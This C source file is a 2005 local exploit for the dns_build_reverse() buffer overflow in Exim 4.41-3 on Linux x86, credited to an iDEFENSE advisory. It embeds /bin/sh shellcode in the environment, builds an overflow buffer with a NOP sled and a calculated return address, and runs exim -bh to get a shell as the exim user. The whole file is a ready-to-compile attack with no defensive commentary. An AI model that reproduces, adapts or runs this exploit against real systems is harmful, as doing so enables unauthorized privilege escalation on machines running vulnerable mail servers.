/*
 * eximple.c by <cenobyte@binbash.org> 2005
 *
 * Exim 4.41-3 Linux x86 local exploit that yields uid=502(exim) for the
 * dns_buld_reverse() buffer overflow vulnerability from iDEFENSE security
 * advisory 01.14.05.
 *
 * Props go to gloomy & The Itch for their "Radical Environmentalists" paper on
 * which this exploit technique is based on.
 * 
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define bufsize	284

char ipv6[] = "\x3A\x3A\x25\x41";

/* Linux x86 /bin/sh shellcode by <breeze@binbash.org>
 */
char sc[] = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e"
	    "\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3"
	    "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
	    "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	    "\x54\x52\x4f\x45\x50\x4a\x55\x48\x53";

int
main(int argc, char *argv[])
{
	char buf[bufsize];
	char *prg[] = { "/usr/exim/bin/exim", "-bh", buf, NULL };
	char *env[] = { sc, NULL };

	unsigned long ret = 0xc0000000 - sizeof(void*) - strlen(prg[0]) - strlen(sc);

	memset(buf, 0x90, sizeof(buf));
	memcpy(buf, (char *)&ipv6, 4);
	memcpy(buf + bufsize, (char *)&ret, 4);

	execve(prg[0], prg, env);

	return(0);
}
